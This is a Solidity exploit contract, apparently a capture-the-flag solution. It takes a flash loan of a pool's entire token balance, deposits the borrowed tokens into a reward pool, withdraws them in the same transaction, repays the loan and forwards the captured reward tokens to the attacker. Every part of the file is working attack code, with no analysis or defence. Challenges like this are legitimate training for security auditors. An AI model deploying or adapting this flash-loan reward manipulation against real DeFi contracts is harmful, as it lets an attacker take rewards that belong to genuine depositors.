// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashLoanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

contract AttackTheRewarder {
    IFlashLoanPool immutable flashLoanPool;
    IRewardPool immutable rewardPool;

    IERC20 immutable liquidityToken;
    IERC20 immutable rewardToken;

    address immutable player;

    constructor(
        address _flashLoanPool,
        address _rewardPool,
        address _liquidityToken,
        address _rewardToken
    ) {
        flashLoanPool= IFlashLoanPool(_flashLoanPool);
        rewardPool= IRewardPool(_rewardPool);
        liquidityToken = IERC20(_liquidityToken);
        rewardToken = IERC20(_rewardToken);
        player = msg.sender;
    }

    function attack() external {
        flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

    }

    function receiveFlashLoan(uint256 amount) external {
        require(msg.sender == address(flashLoanPool));
        require(tx.origin == player);

        // Deposit
        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);

        // Withdraw
        rewardPool.withdraw(amount);

        // Pay loan and send reward token to player
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }

}